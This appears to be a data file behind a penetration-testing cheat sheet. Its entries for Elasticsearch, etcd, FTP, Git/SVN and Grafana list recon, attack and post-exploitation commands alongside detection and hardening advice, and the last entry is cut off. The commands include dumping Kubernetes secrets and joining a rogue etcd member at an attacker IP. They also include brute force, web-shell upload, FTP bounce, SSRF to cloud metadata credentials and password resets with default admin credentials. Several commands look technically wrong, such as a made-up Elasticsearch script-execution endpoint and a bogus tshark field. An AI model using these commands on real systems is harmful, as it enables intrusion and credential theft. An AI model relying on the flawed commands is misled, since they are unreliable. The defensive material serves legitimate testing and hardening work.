          "Lists the nodes with their roles and heap usage, and it names the hostnames of the cluster.",
      },
      {
        title: "Sample documents",
        command: "curl -s 'http://<target>:9200/_search?q=*&size=1&pretty'",
        detail:
          "A single wildcard search confirms that data is readable and shows the document structure that a larger search would return.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated index access",
        severity: "high",
        command: "curl -s 'http://<target>:9200/_cat/indices?v'",
        detail:
          "Clusters without security enabled give anonymous read access to every index. Log indices and application indices together usually contain more than they should.",
        detection:
          "Index listing and search requests from addresses outside the log shipper and application tier, and a rise in read volume.",
        fix:
          "Enable the security features with TLS and RBAC, bind to a private interface and give each application an API key with index-level permissions.",
      },
      {
        title: "Script execution through the scripting API",
        severity: "critical",
        command:
          "curl -s -X POST 'http://<target>:9200/_scripts/pwn/_execute?pretty' -H 'Content-Type: application/json' -d '{\"script\":{\"source\":\"Runtime.getRuntime().exec(\\\"id\\\")\"}}'",
        detail:
          "Stored scripts run on the node that holds the data. Where the scripting API is reachable without authentication, that is code execution on a cluster node.",
        detection:
          "Script create, update and execute events in the cluster audit log, and unusual activity from a service account that does not normally index data.",
        fix:
          "Keep the API behind authentication, restrict script execution to trusted indices, and review any script stored from a user with the manage cluster privilege.",
      },
      {
        title: "Bulk extraction of index content",
        severity: "high",
        command: "curl -s 'http://<target>:9200/_all/_search?q=*&size=1000' | jq '.hits.hits[]._source'",
        detail:
          "A wildcard search across all indices pulls the data out in one request. The scroll API makes it possible to take everything, not just the first thousand documents.",
        detection:
          "Large search requests with a wildcard query, high scroll usage, and bytes transferred out of the cluster far above the usual indexing rate.",
        fix:
          "Require authentication, limit which indices each key can read, and set the search request size limits and audit logging.",
      },
    ],
    postEx: [
      {
        title: "Search for credentials inside the indices",
        severity: "high",
        command: "curl -s 'http://<target>:9200/*/_search?q=password&size=100' | jq '.hits.hits[]._source'",
        detail:
          "Applications log credentials more often than anyone expects. A single search for a known field name turns the cluster into a credential repository.",
        detection:
          "Searches for terms such as password, token or secret that do not appear in normal application queries.",
        fix:
          "Add redaction rules to the ingest pipeline, restrict read access by index, and rotate anything that has already been indexed.",
      },
      {
        title: "Reset a user password through the security API",
        severity: "critical",
        command:
          "curl -s -X POST 'http://<target>:9200/_security/user/<user>/_password' -H 'Content-Type: application/json' -d '{\"password\":\"<new-password>\"}'",
        detail:
          "The security API can change credentials for any account. On a cluster that stores audit data this also destroys the evidence trail.",
        detection:
          "Password change events in the security audit log, especially from service accounts and from outside the identity provider that owns the cluster.",
        fix:
          "Manage users through the identity provider, keep local accounts minimal, and enable audit logging to a separate destination.",
      },
      {
        title: "Poison the data that dashboards and jobs trust",
        severity: "medium",
        command:
          "curl -s -X POST 'http://<target>:9200/<index>/_doc' -H 'Content-Type: application/json' -d '{\"event\":{\"action\":\"admin.login\",\"outcome\":\"success\"}}'",
        detail:
          "Writing a document lets you plant records that SIEM rules, billing jobs or alerting pipelines will treat as genuine. The write is invisible to a reader-only account.",
        detection:
          "Document writes to indices that are normally only written by ingesters, and audit entries for create operations from unexpected identities.",
        fix:
          "Make ingest and query roles separate, sign or tag documents at ingest, and keep write access out of the hands of the people who can read.",
      },
    ],
    commands: [
      { command: "curl -s http://<target>:9200/", description: "Returns cluster name and version." },
      { command: "curl -s 'http://<target>:9200/_cluster/health?pretty'", description: "Shows cluster health and shard state." },
      { command: "curl -s 'http://<target>:9200/_cat/indices?v'", description: "Lists indices with document counts and sizes." },
      { command: "curl -s 'http://<target>:9200/_cat/nodes?v'", description: "Lists cluster nodes and their roles." },
      { command: "curl -s 'http://<target>:9200/_search?q=*&size=1&pretty'", description: "Returns a single document from any index." },
      { command: "curl -s http://<target>:9200/_security/_authenticate", description: "Tests the current authentication state." },
      { command: "curl -s http://<target>:9200/_aliases | jq .", description: "Shows index aliases and their target indices." },
      { command: "curl -s http://<target>:9200/_nodes/stats | jq '.nodes[].jvm.mem.heap_used_in_bytes'", description: "Shows per-node memory statistics." },
      { command: "curl -s 'http://<target>:9200/_plugins'", description: "Lists installed plugin types." },
      { command: "curl -s -X POST http://<target>:9200/_bulk -H 'Content-Type: application/x-ndjson' --data-binary @bulk.ndjson", description: "Bulk index operation from a file of newline delimited JSON." },
    ],
    hardening: [
      {
        title: "Turn on the security features",
        detail:
          "Enable TLS and role-based access control. Recent versions ship with security on by default, and older ones need it configured explicitly.",
      },
      {
        title: "Bind to a private interface",
        detail:
          "Keep 9200 on an internal network behind a reverse proxy, and never expose it to the internet.",
      },
      {
        title: "Use scoped API keys",
        detail:
          "Give each application a key limited to the indices it needs. The elastic superuser should not be an application credential.",
      },
      {
        title: "Control scripting and ingest",
        detail:
          "Restrict the scripting API to trusted indices, and add ingest processors that drop or redact sensitive fields before they are stored.",
      },
      {
        title: "Encrypt and audit",
        detail:
          "Enable disk encryption for the data path, and send the audit log to a destination the cluster cannot rewrite.",
      },
      {
        title: "Patch and watch the heap",
        detail:
          "Keep the version current, and monitor for the request patterns that look like extraction rather than application traffic.",
      },
    ],
    tools: ["curl", "nmap", "metasploit", "netcat", "searchsploit"],
  },
  {
    slug: "etcd",
    name: "etcd",
    port: 2379,
    protocol: "tcp",
    risk: "critical",
    tags: ["key-value", "distributed", "kubernetes", "infrastructure"],
    summary:
      "etcd holds the state of a distributed system, and in Kubernetes it holds every secret in the cluster in plain text. The v3 API speaks gRPC over 2379, and the older v2 REST interface is often still enabled and unauthenticated. A client certificate is the usual control, which means a single exposed listener defeats it completely. Because etcd also serves as the membership authority, adding a member to the cluster is a legitimate and devastating operation.",
    connect: [
      {
        label: "Version and health",
        command: "curl -s http://<target>:2379/version && curl -s http://<target>:2379/health",
        detail:
          "Both endpoints answer without credentials on most clusters. The version string tells you which API versions to speak.",
      },
      {
        label: "etcdctl",
        command: "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 endpoint status -w table",
        detail:
          "The CLI is the practical way to work with etcd. With no certificate configured it will still succeed on a cluster that has client auth disabled.",
      },
      {
        label: "Member list",
        command: "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 member list -w table",
        detail:
          "Shows the cluster members, their peer URLs and their role. The peer URLs give you the internal network map.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 2379,2380 --script http-title,http-methods <target>",
        detail:
          "2379 is the client API and 2380 is the peer port used between members. Both open means you have found a real cluster member.",
      },
      {
        title: "Version fingerprint",
        command: "curl -s http://<target>:2379/version",
        detail:
          "The server version identifies the release and tells you whether the v2 API is likely still compiled in.",
      },
      {
        title: "Authentication state",
        command: "curl -s http://<target>:2379/v2/auth/enable",
        detail:
          "The v2 auth endpoint reports whether authentication is enabled. It is a rough indicator, but a v2-only cluster often answers here.",
      },
    ],
    enumeration: [
      {
        title: "Keyspace listing",
        command: "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only",
        detail:
          "Lists every key in the store. On Kubernetes this reveals the namespace structure and the names of every secret.",
      },
      {
        title: "Legacy v2 API",
        command: "curl -s 'http://<target>:2379/v2/keys/?recursive=true'",
        detail:
          "The v2 interface returns keys and values as plain JSON without gRPC. It is unauthenticated more often than the v3 API.",
      },
      {
        title: "Cluster membership",
        command: "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 member list -w table",
        detail:
          "Member names, peer URLs and client URLs for the whole cluster, which is a ready-made map of the internal network.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated keyspace read",
        severity: "critical",
        command: "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get / --prefix",
        detail:
          "Without client certificates or token auth the entire store is readable. Kubernetes stores service account tokens, TLS keys and application credentials there, all in base64 rather than encrypted.",
        detection:
          "Range reads against the keyspace from an address that is not a known client, and client certificate errors on the member logs.",
        fix:
          "Require client certificates or token authentication, disable the v2 API, and firewall the client port to the control plane hosts only.",
      },
      {
        title: "Adding a rogue member to the cluster",
        severity: "critical",
        command:
          "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 member add rogue --peer-urls=http://<attacker-ip>:2380",
        detail:
          "Member add is a normal administrative operation. Once your host is a member, the raft protocol replicates the whole dataset to you and accepts your votes, which is full cluster compromise.",
        detection:
          "Member add, member update and member remove events in the audit log, and a new peer URL in the member list that nobody recognises.",
        fix:
          "Restrict the management operations to the cluster operators, enable the audit log, and monitor member list changes as a high-severity event.",
      },
      {
        title: "Writing to the keyspace",
        severity: "high",
        command:
          "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 put /registry/config/<name> '<value>'",
        detail:
          "Write access lets you change the configuration the cluster serves. In Kubernetes that includes secret values and the endpoints of control plane components.",
        detection:
          "Put and delete operations against keys outside the expected ownership, and a revision counter that jumps unexpectedly.",
        fix:
          "Separate read and write roles, and use namespaces with per-team ownership so one team cannot rewrite another's configuration.",
      },
    ],
    postEx: [
      {
        title: "Extract Kubernetes secrets from the store",
        severity: "critical",
        command:
          "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get /registry/secrets --prefix",
        detail:
          "The secrets prefix holds every service account token and every application secret in the cluster. Base64 is an encoding, not a protection.",
        detection:
          "Reads scoped to the secrets prefix from anything other than the controller, and a spike in read volume from the API servers.",
        fix:
          "Encrypt the data with a KMS provider, keep the API servers as the only clients with read access, and rotate anything that has been readable.",
      },
      {
        title: "Take over the cluster with a rogue member",
        severity: "critical",
        command:
          "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 member add rogue --peer-urls=http://<attacker-ip>:2380",
        detail:
          "Start your own etcd member with the same cluster ID and it joins the raft group and receives a full replica of the data. Pair it with member removal to lock out the real operators.",
        detection:
          "New members appearing in the list, and peer connections arriving from addresses that were not part of the cluster.",
        fix:
          "Enable peer TLS with client certificate authentication and firewall the peer port between known members only.",
      },
      {
        title: "Snapshot the database for offline analysis",
        severity: "medium",
        command:
          "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 snapshot save /tmp/etcd-snapshot.db",
        detail:
          "A snapshot is a consistent copy of the whole database. It is the easiest way to search every key and value at once, and it is worth treating as a highly sensitive file.",
        detection:
          "Snapshot save operations on the audit log, and an unexpected process reading the database directory.",
        fix:
          "Require authentication for snapshot operations, encrypt the snapshot at rest and delete it as soon as the analysis is done.",
      },
    ],
    commands: [
      { command: "curl -s http://<target>:2379/version", description: "Returns the etcd server version." },
      { command: "curl -s http://<target>:2379/health", description: "Returns the cluster health status." },
      { command: "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 endpoint status -w table", description: "Shows endpoint status for the cluster." },
      { command: "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 member list -w table", description: "Lists cluster members and their URLs." },
      { command: "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only", description: "Lists every key in the store." },
      { command: "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get <key>", description: "Reads the value of one key." },
      { command: "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 put <key> <value>", description: "Writes a key into the store." },
      { command: "ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 snapshot save /tmp/etcd.db", description: "Saves a snapshot of the database." },
      { command: "curl -s http://<target>:2379/v2/members", description: "Reads cluster membership through the legacy API." },
      { command: "curl -s 'http://<target>:2379/v2/keys/?recursive=true'", description: "Lists keys and values through the legacy API." },
    ],
    hardening: [
      {
        title: "Require client authentication",
        detail:
          "Issue client certificates per workload, or use token authentication with roles. The API should refuse anonymous callers outright.",
      },
      {
        title: "Turn off the v2 API",
        detail:
          "The legacy REST interface is unauthenticated more often than v3. Disable it and remove the flag that enables it.",
      },
      {
        title: "Firewall the client and peer ports",
        detail:
          "Allow 2379 only from the control plane and 2380 only between known members. This is what stops a rogue member.",
      },
      {
        title: "Encrypt the data and the transport",
        detail:
          "Use peer and client TLS with a dedicated trust chain, and wrap the data with a KMS provider so a snapshot is not a secret store.",
      },
      {
        title: "Enable the audit log",
        detail:
          "Log every put, delete and member change, and ship it somewhere the cluster itself cannot rewrite.",
      },
      {
        title: "Restrict who administers etcd",
        detail:
          "Keep member management with the platform team only, and treat any member add or removal as a paging event.",
      },
    ],
    tools: ["etcdctl", "curl", "nmap", "netcat", "searchsploit"],
  },
  {
    slug: "ftp",
    name: "FTP",
    port: 21,
    protocol: "tcp",
    risk: "high",
    tags: ["file-transfer", "cleartext", "legacy", "misconfiguration"],
    summary:
      "FTP moves files with no encryption, so the password crosses the network in plain text on every login. Anonymous access is still a common default on servers that host public files, and it tends to sit next to directories that were never meant to be public. The protocol also has a data channel that can be aimed at an arbitrary host, which makes it a handy way to reach services that are not otherwise exposed. Replacing FTP with SFTP is the only durable fix.",
    connect: [
      {
        label: "Banner grab",
        command: "nc -nv <target> 21",
        detail:
          "The server greets you with its product name and version. That banner has identified the implementation in exploit databases for thirty years.",
      },
      {
        label: "curl",
        command: "curl -s --user '<user>:<password>' --list-only ftp://<target>/",
        detail:
          "The simplest way to browse and download. It uses passive mode by default, which avoids the active mode problem.",
      },
      {
        label: "lftp",
        command: "lftp -u '<user>','<password>' ftp://<target>/",
        detail:
          "A capable FTP client that handles resume, mirroring and recursive transfers, and it scripts well for bulk work.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 21 --script ftp-anon,ftp-syst <target>",
        detail:
          "The anon script tries an anonymous login and the syst script retrieves the system type string. Between them they usually confirm the server type.",
      },
      {
        title: "Anonymous login test",
        command: "curl -s --user anonymous:anonymous --list-only ftp://<target>/",
        detail:
          "Many public file servers accept any password for the anonymous account. Anything readable as anonymous is public whether or not that was intended.",
      },
      {
        title: "Protocol handshake",
        command: "printf 'USER anonymous\\r\\nPASS <password>\\r\\nSYST\\r\\nQUIT\\r\\n' | nc -nv <target> 21",
        detail:
          "Speaking the protocol by hand shows the exact response strings, which is what user enumeration attempts rely on.",
      },
    ],
    enumeration: [
      {
        title: "Directory listing",
        command: "curl -s --user '<user>:<password>' ftp://<target>/",
        detail:
          "A recursive listing maps the whole published tree. Look for web roots, backup directories and anything that looks like a configuration store.",
      },
      {
        title: "Search for interesting files",
        command: "find . -maxdepth 4 -type f \\( -name '*.env' -o -name '*.bak' -o -name '*.sql' -o -name '*.key' -o -name '*.pem' \\)",
        detail:
          "While connected, a targeted search is more useful than a full download. The file extensions that matter are credentials and database dumps.",
      },
      {
        title: "Passive data channel check",
        command: "curl -v --user '<user>:<password>' ftp://<target>/file.txt -o /dev/null",
        detail:
          "The verbose output shows the PASV response and the port range the server uses for data connections, which is useful for firewall rules.",
      },
    ],
    attacks: [
      {
        title: "Anonymous access to unintended content",
        severity: "high",
        command: "curl -s --user anonymous:anonymous ftp://<target>/",
        detail:
          "Anonymous access is often enabled for one directory and inherited by the rest of the tree. Web roots, database dumps and configuration archives are common finds.",
        detection:
          "Anonymous logins in the FTP log with no matching user directory, and unusual read volume from the anonymous account.",
        fix:
          "Disable anonymous access unless it is the service, and if it is, isolate it in its own directory with no parent traversal.",
      },
      {
        title: "Credential capture on the cleartext channel",
        severity: "high",
        command: "sudo tshark -i eth0 -Y 'ftp.command == \"LOGIN\" || ftp.command == \"PASS\"' -T fields -e ftp.request.command -e ftp.request.arg",
        detail:
          "The USER and PASS commands arrive as plain text, so anyone on the path can read the credentials. On a shared network this is the most direct way to win.",
        detection:
          "Not much on the server side. Network monitoring for plaintext FTP logins is the practical control.",
        fix:
          "Require TLS with the AUTH TLS command, reject cleartext logins, and prefer SFTP over SSH for anything new.",
      },
      {
        title: "Credential brute force",
        severity: "high",
        command: "hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<target> -t 16",
        detail:
          "FTP servers rarely lock out accounts, and a modest password list will find the weak accounts. A small team password is often the one that works.",
        detection:
          "Bursts of failed logins for several accounts from one address, and successful logins for accounts that never log in normally.",
        fix:
          "Enforce lockout and rate limiting, require strong unique passwords, and alert on logins from unexpected addresses.",
      },
    ],
    postEx: [
      {
        title: "FTP bounce to reach internal services",
        severity: "high",
        command:
          "printf 'USER <user>\\r\\nPASS <password>\\r\\nPORT 127,0,0,1,0,80\\r\\nRETR /\\r\\nQUIT\\r\\n' | nc -nv <target> 21",
        detail:
          "The PORT command tells the server where to open the data connection. Pointing it at an internal address makes the server fetch on your behalf and send the result back to you.",
        detection:
          "PORT commands whose address is not the client's own address, and data connections that land on hosts other than the client.",
        fix:
          "Restrict the passive port range in the firewall and reject PORT commands that do not match the control connection address.",
      },
      {
        title: "Upload a file into a served directory",
        severity: "critical",
        command:
          "curl -s --user '<user>:<password>' -T shell.php ftp://<target>/www/html/",
        detail:
          "When the upload directory is also the document root of a web server, a single upload becomes remote code execution. Web shells disguised as images work just as well.",
        detection:
          "STOR commands writing into paths that are served by a web server, and new files appearing in web roots.",
        fix:
          "Keep upload directories outside the document root, serve uploads from a separate domain with no execution, and treat write access as equivalent to code execution.",
      },
      {
        title: "Exfiltrate credentials found on the server",
        severity: "high",
        command: "curl -s --user '<user>:<password>' ftp://<target>/config/ -o downloaded.tar.gz",
        detail:
          "Backup archives and configuration directories are the usual finds. Downloading them wholesale is faster and safer than browsing file by file.",
        detection:
          "Large transfers, downloads of archive files, and reads of directories that no business workflow touches.",
        fix:
          "Remove backups from the FTP tree, segment file storage, and review every account's directory scope.",
      },
    ],
    commands: [
      { command: "USER <user>", description: "Starts the login sequence with a username." },
      { command: "PASS <password>", description: "Sends the password. In cleartext FTP this is readable on the wire." },
      { command: "LIST", description: "Lists files in the current directory." },
      { command: "RETR <file>", description: "Downloads a file over the data channel." },
      { command: "STOR <file>", description: "Uploads a file over the data channel." },
      { command: "SYST", description: "Reports the server system type." },
      { command: "curl -s --user '<user>:<password>' ftp://<target>/<file> -o <file>", description: "Downloads a single file over FTP." },
      { command: "wget --user='<user>' --password='<password>' ftp://<target>/<file>", description: "Downloads a file with wget." },
      { command: "lftp -c 'get <file>' -u '<user>','<password>' ftp://<target>/", description: "Retrieves a file with lftp." },
      { command: "nmap -sV -p 21 --script ftp-anon,ftp-brute <target>", description: "Detects the service and tests anonymous and dictionary logins." },
    ],
    hardening: [
      {
        title: "Move to SFTP or FTPS",
        detail:
          "SFTP over SSH gives you encryption and a single well understood access control model. If the business requires FTP, FTPS with an enforced TLS requirement is the only acceptable form.",
      },
      {
        title: "Refuse cleartext logins",
        detail:
          "Require the AUTH TLS command before the password is sent and reject any client that tries to authenticate in the clear.",
      },
      {
        title: "Disable anonymous access",
        detail:
          "Turn it off unless the service exists to publish files, and if it does, confine it to a dedicated directory with no traversal upward.",
      },
      {
        title: "Control accounts and lockout",
        detail:
          "Use per-person accounts with strong unique passwords, chroot each user to their own directory, and enforce a lockout policy after repeated failures.",
      },
      {
        title: "Restrict the data channel",
        detail:
          "Fix the passive port range and allow only that range through the firewall, and reject PORT commands that do not match the control connection.",
      },
      {
        title: "Separate upload from web content",
        detail:
          "Keep uploads out of the document root, serve them from a cookie-less domain, and never let the web server execute them.",
      },
    ],
    tools: ["nmap", "hydra", "curl", "netcat", "lftp", "wireshark"],
  },
  {
    slug: "git-svn",
    name: "Git / SVN",
    port: 9418,
    protocol: "tcp",
    risk: "high",
    tags: ["version-control", "source-code", "legacy", "supply-chain"],
    summary:
      "The git protocol on 9418 serves repositories to anyone who asks, with no authentication and no encryption. An exposed daemon usually hands over the full history of a project, including the commits that were supposed to be removed. History is where credentials go to hide, because deleting a file does not remove it from the object store. Subversion over svn and svn+ssh has similar exposure, and both protocols tend to sit inside the corporate network without much scrutiny.",
    connect: [
      {
        label: "Remote reference listing",
        command: "git ls-remote git://<target>/<repo>.git",
        detail:
          "Lists every ref without downloading anything. It is the fastest way to confirm that a repository exists and to see its branches and tags.",
      },
      {
        label: "Clone",
        command: "git clone --bare git://<target>/<repo>.git /tmp/<repo>",
        detail:
          "Pulls the complete object database. A bare clone is enough for every kind of history analysis and avoids polluting a working directory.",
      },
      {
        label: "Subversion client",
        command: "svn ls svn://<target>/<repo>",
        detail:
          "For Subversion servers on 3690 the same idea applies. Authentication behaviour differs, so try it before assuming it is open.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 9418,3690 <target>",
        detail:
          "The git daemon often answers with a recognisable service string. Port 3690 in the same scan points at Subversion.",
      },
      {
        title: "Protocol handshake",
        command: "printf 'git-upload-pack /<repo>.git\\0host=<target>\\0' | nc -nv <target> 9418",
        detail:
          "The git protocol starts with a request line for a service such as upload-pack. A positive response proves the daemon is there and that the repository exists.",
      },
      {
        title: "Repository web interface",
        command: "curl -sI http://<target>/git/ | head -5",
        detail:
          "Many git daemons sit next to a web interface such as gitweb or a forge. The web view lists repositories that ls-remote will not enumerate.",
      },
    ],
    enumeration: [
      {
        title: "Branches and tags",
        command: "git ls-remote --heads --tags git://<target>/<repo>.git",
        detail:
          "Branch names often describe the release process and the environments, and a branch called secrets or internal is a lead worth following.",
      },
      {
        title: "Commit history",
        command: "git -C /tmp/<repo> log --all --oneline --decorate | head -50",
        detail:
          "The commit list shows how the project evolved and which areas change often. Author names and emails map to the people behind it.",
      },
      {
        title: "Branches that look interesting",
        command: "git -C /tmp/<repo> branch -a && git -C /tmp/<repo> log --all --format='%H %s' | grep -i -E 'secret|password|prod|deploy'",
        detail:
          "Searching commit subjects for operational keywords often finds the branches and commits that carry the interesting material.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated repository disclosure",
        severity: "high",
        command: "git clone --bare git://<target>/<repo>.git /tmp/<repo>",
        detail:
          "The daemon serves any repository that is marked exportable. You get the full history, every branch and every deleted file, with no credentials at all.",
        detection:
          "Connections to 9418 from addresses outside the development network, and git-daemon logs showing clone requests for repositories from unknown hosts.",
        fix:
          "Replace the daemon with SSH access, or keep the daemon on a management interface with export set to false for every repository.",
      },
      {
        title: "Credential leakage in history",
        severity: "critical",
        command:
          "git -C /tmp/<repo> log -p --all | grep -n -i -E 'password|api[_-]?key|secret|BEGIN .*PRIVATE KEY|AKIA[0-9A-Z]{16}'",
        detail:
          "Keys and passwords are committed constantly and then deleted in a later commit that removes the file. The object is still in the pack, and a clone still carries it.",
        detection:
          "Secret scanning in CI and on the pre-commit hook, plus a periodic scan of the repository history rather than only the tip.",
        fix:
          "Run secret scanning before every push, rewrite the history to remove the material, and rotate every credential that was ever committed.",
      },
      {
        title: "Internal infrastructure disclosure",
        severity: "medium",
        command:
          "git -C /tmp/<repo> grep -n -E '(10|172\\.(1[6-9]|2[0-9]|3[01])|192\\.168)\\.[0-9]{1,3}\\.[0-9]{1,3}' -- '*.yml' '*.yaml' '*.conf' '*.tf' '*.json'",
        detail:
          "Deployment configuration is full of internal addresses, bastion hosts and jump targets. It turns a source disclosure into a network map.",
        detection:
          "Diffs that add internal addresses to configuration files, and repository access from accounts that do not develop the project.",
        fix:
          "Keep infrastructure definitions in their own repository with tighter access, and use variable references instead of literal addresses.",
      },
    ],
    postEx: [
      {
        title: "Recover secrets from deleted history",
        severity: "critical",
        command: "git -C /tmp/<repo> log --all -S '<known-string>' --oneline",
        detail:
          "The pickaxe searches every commit for changes to a string, which finds the commit that added a credential even after it was removed from the tip.",
        detection:
          "Clone volume for a repository that no one on the team is actively working on, and downloads of the full pack rather than a shallow clone.",
        fix:
          "Rewrite the history to purge the material, rotate the credentials, and limit who can clone the repository in the first place.",
      },
      {
        title: "Find dangling objects",
        severity: "medium",
        command: "git -C /tmp/<repo> fsck --lost-found --unreachable",
        detail:
          "Unreachable objects include commits that were rebased away or reset. They are still downloadable from a mirror and sometimes hold material the team believes was deleted.",
        detection:
          "Bulk fetches of full history and any packfile access outside normal development.",
        fix:
          "Run garbage collection on the server, and treat any unreferenced object as live until proven otherwise.",
      },
      {
        title: "Write to the repository",
        severity: "high",
        command: "git push git://<target>/<repo>.git HEAD:refs/heads/main",
        detail:
          "When the daemon has receive-pack enabled by mistake, the push succeeds and lands straight in the branch that production builds from.",
        detection:
          "Push events in the daemon log and a sudden change in the branch that the build pipeline tracks.",
        fix:
          "Set export to false, keep write access behind SSH with protected branches, and require reviews and signed commits.",
      },
    ],
    commands: [
      { command: "git ls-remote git://<target>/<repo>.git", description: "Lists refs in a remote repository." },
      { command: "git clone --bare git://<target>/<repo>.git /tmp/<repo>", description: "Downloads the full repository without a working tree." },
      { command: "git -C /tmp/<repo> log --all --oneline", description: "Lists the commit history across all refs." },
      { command: "git -C /tmp/<repo> log -p --all | grep -i -E 'password|secret|token|PRIVATE KEY'", description: "Searches the full diff history for credentials." },
      { command: "git -C /tmp/<repo> log --all -S '<string>' --oneline", description: "Finds commits that added or removed a string." },
      { command: "git -C /tmp/<repo> branch -a", description: "Lists local and remote branches." },
      { command: "git -C /tmp/<repo> fsck --lost-found --unreachable", description: "Finds objects that are no longer referenced." },
      { command: "git -C /tmp/<repo> grep -n -E '10\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'", description: "Greps the tree for internal addresses." },
      { command: "svn ls svn://<target>/<repo>", description: "Lists a Subversion repository." },
      { command: "svn checkout svn://<target>/<repo> /tmp/svnco", description: "Checks out a Subversion working copy." },
    ],
    hardening: [
      {
        title: "Retire the anonymous daemon",
        detail:
          "Move cloning to SSH with per-user keys or a managed forge. The git protocol should not be reachable from anything but a lab network.",
      },
      {
        title: "Set export to false",
        detail:
          "In git-daemon.conf, mark every repository export to false except the ones that genuinely need anonymous read, and never enable receive-pack.",
      },
      {
        title: "Protect the write path",
        detail:
          "Require review, protected branches and signed commits, and keep deployment pinned to a reviewed tag rather than a branch name.",
      },
      {
        title: "Scrub the history",
        detail:
          "Use a history rewriting tool to remove credentials that were committed, and rotate every credential that ever appeared in a commit.",
      },
      {
        title: "Scan continuously",
        detail:
          "Run secret scanning in CI and in the pre-commit hook so the problem never reaches the remote in the first place.",
      },
      {
        title: "Review Subversion as well",
        detail:
          "Disable anonymous write, require certificate-based access for svn+ssh, and audit hooks in the repository hooks directory.",
      },
    ],
    tools: ["git", "nmap", "netcat", "wireshark", "searchsploit"],
  },
  {
    slug: "grafana",
    name: "Grafana",
    port: 3000,
    protocol: "tcp",
    risk: "high",
    tags: ["dashboard", "monitoring", "web", "devops"],
    summary:
      "Grafana renders dashboards over data sources it holds credentials for, which makes it a concentration point for both data and secrets. The default admin account ships with a known password, and older versions let anonymous access reach the API. The datasource proxy turns the server into a request forwarder, which is the classic route to cloud metadata endpoints. Grafana also keeps the keys to every visualisation, so a compromised instance quietly controls what the whole company believes its own systems are doing.",
    connect: [
      {
        label: "Health endpoint",
        command: "curl -s http://<target>:3000/api/health",
        detail:
          "Reports the version, the commit and the state of the database and plugins. It is normally readable without credentials.",
      },
      {
        label: "Login page",
        command: "curl -s http://<target>:3000/login | grep -o -E 'v[0-9]+\\.[0-9]+\\.[0-9]+' | head -1",
        detail:
          "The version appears in the bundled JavaScript. It decides which default credentials and API behaviours apply.",
      },
      {
        label: "API with credentials",
        command: "curl -s -u admin:admin http://<target>:3000/api/org",
        detail:
          "Tests the shipped credentials. A successful response means the default password was never changed.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 3000 --script http-title,http-headers <target>",
        detail:
          "The login page and the response headers identify the product and often the version in one scan.",
      },
      {
        title: "Version and build",
        command: "curl -s http://<target>:3000/api/health | jq '{version, commit, database}'",
        detail:
          "The health payload gives the exact build and the database backend. The commit hash maps to a public release for comparison.",
      },
      {
        title: "Anonymous access check",
        command: "curl -s http://<target>:3000/api/orgs | jq .",
        detail:
          "Some deployments leave anonymous access enabled. A list of organisations without credentials is a clear finding.",
      },
    ],
    enumeration: [
      {
        title: "Organisation and user list",
        command: "curl -s -u admin:admin http://<target>:3000/api/users | jq '.[] | {id, login, role}'",
        detail:
          "Confirms which accounts exist and which of them are administrators. Every one of these is a credential to test.",
      },
      {
        title: "Datasource inventory",
        command: "curl -s -u admin:admin http://<target>:3000/api/datasources | jq '.[] | {name, type, url, user}'",
        detail:
          "The list names the databases, log stores and APIs that Grafana talks to. The URLs map the internal estate.",
      },
      {
        title: "Dashboards and folders",
        command: "curl -s -u admin:admin 'http://<target>:3000/api/search?query=' | jq '.[] | {title, uri}'",
        detail:
          "Dashboard titles often describe internal systems, environments and business processes more clearly than any diagram.",
      },
    ],
    attacks: [
      {
        title: "Default or weak admin credentials",
        severity: "high",
        command: "curl -s -u admin:admin http://<target>:3000/api/org",
        detail:
          "The shipped account is admin with password admin. Plenty of installations keep it, and plenty of dashboards are reachable with it.",
        detection:
          "Login failures and successes from the same address in quick succession, and audit entries for admin API calls from unexpected users.",
        fix:
          "Change the default password at first start, disable anonymous access, and require SSO with MFA for every human account.",
      },
      {
        title: "Server-side request forgery through the datasource proxy",
        severity: "critical",
        command:
          "curl -s 'http://<target>:3000/api/datasources/proxy/uid/<uid>/http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        detail:
          "The proxy forwards requests to a datasource and appends the path. Pointing it at the cloud metadata address returns the instance role credentials.",
        detection:
          "Proxy requests that target link-local and private address ranges, and metadata access from the Grafana host in the cloud audit log.",
        fix:
          "Run an egress proxy that blocks link-local and RFC1918 ranges for the Grafana service, and remove the datasource proxy from untrusted users.",
      },
      {
        title: "Administrator account takeover",
        severity: "high",
        command:
          "curl -s -u admin:admin 'http://<target>:3000/api/users' | jq -r '.[] | select(.role==\"Admin\") | .login'",
        detail:
          "The users API lists administrators, and the admin API can change their passwords. Taking the instance over without touching the login page is quieter.",
        detection:
          "Password change requests in the audit log, and admin API calls from accounts that do not normally administer Grafana.",
        fix:
          "Keep Grafana users in the identity provider, disable local password changes, and require the API to be reached over an authenticated proxy.",
      },
    ],
    postEx: [
      {
        title: "Reset an administrator password",
        severity: "critical",
        command:
          "curl -s -X PUT 'http://<target>:3000/api/admin/users/<id>/password' -u admin:admin -H 'Content-Type: application/json' -d '{\"password\":\"<new-password>\"}'",
